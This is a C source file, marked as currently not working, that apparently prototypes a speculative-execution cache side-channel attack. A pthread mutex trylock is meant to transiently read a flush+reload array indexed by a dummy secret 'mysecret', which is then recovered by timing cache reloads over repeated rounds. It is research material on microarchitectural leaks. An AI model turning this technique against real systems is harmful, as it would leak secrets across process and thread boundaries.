/*==================================*
 * NOTE: CURRENTLY DOES NOT WORK    *
 *==================================*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define CACHE_HIT 225
#define N_PAGES 256

#define REPETITIONS 100
#define N_TRAINING 10
#define SECRET_SIZE 1 //9
#define SECRET "mysecret"

#define false 0
#define true  1
#define DBG 0

#define FLAG PTHREAD_MUTEX_DEFAULT
//#define FLAG PTHREAD_MUTEX_ADAPTIVE_NP

cp_t* flush_reload_arr;
pthread_mutex_t k;

void* thread1(void* data) {

    char* allow_lock = (char*)data;
    printf("t1\tlock_bool %d\n", *allow_lock);
    if(*allow_lock) {
        pthread_mutex_lock(&k);
        printf("t1\tsleeping...\n");
        sleep(1);
        pthread_mutex_unlock(&k);
        printf("t1\tunlocked!\n");
    }

    printf("t1\texit\n");
    return NULL;
}

void* thread2(void* data) {
    //volatile cp_t cp = flush_reload_arr[1];
    char* s = (char*)data;
    printf("t2\tsecret_i %d\n", *s);
    flush(&k);
    cpuid();
    if(pthread_mutex_trylock(&k) == 0) {
        volatile cp_t cp = flush_reload_arr[SECRET[0]];
        //volatile cp_t cp1 = flush_reload_arr[SECRET[*s]];
        cpuid();
        printf("t2\tTrylocked!!!\n");
        pthread_mutex_unlock(&k);
    }
    //volatile cp_t cp = flush_reload_arr[1];
    printf("t2\texit\n");//*/
    return NULL;
}

int* prepare(int secret_index) {
    int* results;
    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);
    cpuid();
    //access decisions in array, repeated attacks not traceable for branch predictor
    int  n_accesses =  N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
    char lock_booleans[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        lock_booleans[i] = false;
    }
    lock_booleans[n_accesses-1] = true;

    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        pthread_mutex_init(&k, FLAG);
        cpuid();
        printf("\nround %d\n", i);
        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread1, &lock_booleans[i]);
        usleep(50 * 1000);   //wait 10 ms. Ensure t1 properly starts before t2
        cpuid();
        thread2(&secret_index);

        cpuid();
        if(i < n_accesses-1) {
            cpuid();
            printf("flushing arr!\n");
            flush_arr(flush_reload_arr, N_PAGES);
        }
        else {
            //execute reload() before pthread_join() executes. For some reason, the join operation
            //seems to jumble up the cache traces.
            results = reload(flush_reload_arr, N_PAGES, CACHE_HIT);
            free_flush_reload(flush_reload_arr, N_PAGES);

        }

        cpuid();
        pthread_join(t1, NULL);
        cpuid();
        pthread_mutex_destroy(&k);
        cpuid();
        //volatile cp_t cp4 = flush_reload_arr[4];
    }
    /*volatile int x;
    for(int i = 0; i < 10000000; i++) {
        if(i%2==0)  { int x = 0;}
        else        { int x = 1;}
    }//*/
    cpuid();
    //volatile cp_t cp5 = flush_reload_arr[5];
    cpuid();

    //time loading duration per array index
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    clock_t start2 = clock();

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    clock_t end2 = clock();
    double measured_time = ((double)(end2 - start2))/CLOCKS_PER_SEC;

    print_results(results, REPETITIONS, SECRET, SECRET_SIZE, N_PAGES, CACHE_HIT, measured_time);

    free_results(results, REPETITIONS, SECRET_SIZE);

}